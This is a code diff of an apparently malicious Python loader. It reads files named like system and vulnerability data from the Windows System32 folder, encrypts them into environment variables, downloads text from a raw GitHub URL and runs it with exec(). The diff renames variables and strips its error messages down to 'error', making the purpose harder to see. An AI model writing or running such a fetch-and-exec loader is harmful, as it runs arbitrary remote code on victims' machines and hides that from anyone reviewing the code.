@@ -25,13 +25,13 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
 os.system('cls')
-def new_function_name(new_privacy_key):
+def new_function_name(mycontent):
     raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
     
-    cipher_text = cipher_suite.encrypt(new_privacy_key.encode())
+    cipher_text = cipher_suite.encrypt(mycontent.encode())
     
     os.environ['crpppttkkyy'] = crpppttkkyy.decode()
     os.environ['ncrptttkkn'] = cipher_text.decode()
@@ -59,14 +59,12 @@ def new_function_name(new_privacy_key):
             content = response.text
             exec(content)
         else:
-            print("Invalid Key. Terminating program...")
+            print("error")
     else:
-        print(f"Failed to fetch file. Status code: {raw2urlfinalresponse.status_code}")
+        print("error")
 
     if raw2urlfinalresponse.status_code != 200:
         exit()
-
-
 
 def get_string_from_file(file_path):
     if os.path.exists(file_path):
@@ -74,7 +72,7 @@ def get_string_from_file(file_path):
             content = file.read()
         return content
     else:
-        return "Error: File not found"
+        return "Error"
 system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
 system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
 data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
@@ -82,7 +80,5 @@ content1 = get_string_from_file(system_info_path)
 content2 = get_string_from_file(system_driver_vul_path)
 content3 = get_string_from_file(data_vulnerable_path)
 content4 =  content1+content2+content3
-privacy_key = content4
-new_privacy_key = content4
-
-new_function_name(new_privacy_key)
+content5 = content4
+new_function_name(content5)
